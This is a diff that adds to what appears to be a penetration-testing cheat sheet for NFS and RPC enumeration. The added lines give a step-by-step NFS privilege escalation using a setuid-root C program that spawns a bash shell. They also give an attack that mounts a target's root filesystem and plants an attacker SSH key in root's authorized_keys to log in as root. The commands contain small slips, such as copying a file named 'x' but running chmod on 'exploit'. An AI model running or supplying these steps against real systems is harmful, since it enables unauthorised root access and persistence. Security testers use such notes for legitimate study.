@@ -192,9 +192,12 @@ $ telnet [target] 110
 
 ### RPC/Portmapper [111, 135 TCP]
 
-Enum
+NFS shares
 ```
-$ rpcinfo -p [target]
+$ rpcinfo -p [target]                             # enum NFS shares
+$ showmount -e [ target IP ]                      # show mountable directories
+$ mount -t nfs [target IP]:/ /mnt -o nolock       # mount remote share to your local machine
+$ df -k      
 ```
 
 RPC client
@@ -213,6 +216,44 @@ rpcclient> querygroup 0x200
 rpcclient> querygroupmem 0x200
 rpcclient> queryuser 0x3601
 rpcclient> getusrdompwinfo 0x3601
+```
+
+Exploit NFS shares for privesc:
+```
+$ showmount -e 192.168.xx.53
+Export list for 192.168.xx.53:
+/shared 192.168.xx.0/255.255.255.0
+$ mkdir /tmp/mymount
+/bin/mkdir: created directory '/tmp/mymount'
+$ mount -t nfs 192.168.xx.53:/shared /tmp/mymount -o nolock
+$ cat /root/Desktop/exploit.c
+#include <stdio.h>
+#include <unistd.h>
+int main(void)
+{
+setuid(0);
+setgid(0);
+system("/bin/bash");
+}
+gcc exploit.c -m32 -o exploit
+
+$ cp /root/Desktop/x /tmp/mymount/
+$ chmod u+s exploit
+```
+
+Attack scenario: replace target SSH keys with your own
+```
+$ mkdir -p /root/.ssh
+$ cd /root/.ssh/
+$ ssh-keygen -t rsa -b 4096
+Enter file in which to save the key (/root/.ssh/id_rsa): hacker_rsa
+Enter passphrase (empty for no passphrase): Just Press Enter
+Enter same passphrase again: Just Press Enter
+$ mount -t nfs 192.168.1.112:/ /mnt -o nolock
+$ cd /mnt/root/.ssh
+$ cp /root/.ssh/hacker_rsa.pub /mnt/root/.ssh/
+$ cat hacker_rsa.pub >> authorized_keys                     # add your public key to authorized_keys
+$ ssh -i /root/.ssh/hacker_rsa root@192.168.1.112           # SSH to target using your private key
 ```
 
 ### IMAP
